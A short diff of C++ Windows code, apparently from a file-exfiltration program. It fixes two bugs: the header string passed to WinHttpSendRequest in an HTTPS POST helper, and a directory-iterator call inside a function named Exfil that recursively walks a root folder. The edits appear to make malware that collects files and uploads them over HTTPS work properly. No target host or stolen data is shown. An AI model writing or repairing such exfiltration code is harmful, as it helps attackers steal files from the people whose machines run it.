@@ -256,8 +256,8 @@ static bool HttpPost(const std::string& path,
             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
             WINHTTP_FLAG_SECURE);
         if (r) {
-            std::string head = "Content-Type: " + contentType + "\r\n";
-            ok = WinHttpSendRequest(r, head.c_str(), (DWORD)head.size(),
+            std::wstring whead = Widen("Content-Type: " + contentType + "\r\n");
+            ok = WinHttpSendRequest(r, whead.c_str(), (DWORD)whead.size(),
                                     (LPVOID)body.data(), (DWORD)body.size(),
                                     (DWORD)body.size(), 0) &&
                  WinHttpReceiveResponse(r, nullptr);
@@ -412,7 +412,7 @@ static void Exfil(const std::wstring& rootW) {
              it != fs::recursive_directory_iterator(); ++it) {
             fs::path p = it->path();
             if (SkippedName(p.filename().wstring())) {
-                it->disable_recursion_pending();
+                it.disable_recursion_pending();
                 continue;
             }
             std::error_code fe;
